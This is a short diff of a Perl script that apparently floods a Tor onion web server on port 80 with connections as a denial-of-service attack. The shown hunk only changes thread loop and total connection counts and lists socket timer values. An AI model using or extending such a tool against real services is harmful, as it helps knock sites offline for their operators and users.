@@ -58,8 +58,8 @@ GetOptions('add=s' => \$add) or die "Usage: $0 --add address";
 	my $server = shift || $add; # input a 22 char length Onion address 
 	my $protoport = "80"; #Port of web server to attack
 	my $sleeptimer; #A variable to hold a timer
-	my $threadcon = 50; #The amount of loops per thread/
-	my $concount = 10000; #The total number of connections
+	my $threadcon = 20; #The amount of loops per thread/
+	my $concount = 5000; #The total number of connections
 	my $socktimeout = 5; #Timeout value for the socks socket
 	my $doesitwork; #Variable to a working/notworking thing
 	my @timervalues = ( "2", "30", "90", "240", "500"); #Various values to be used when making connectons
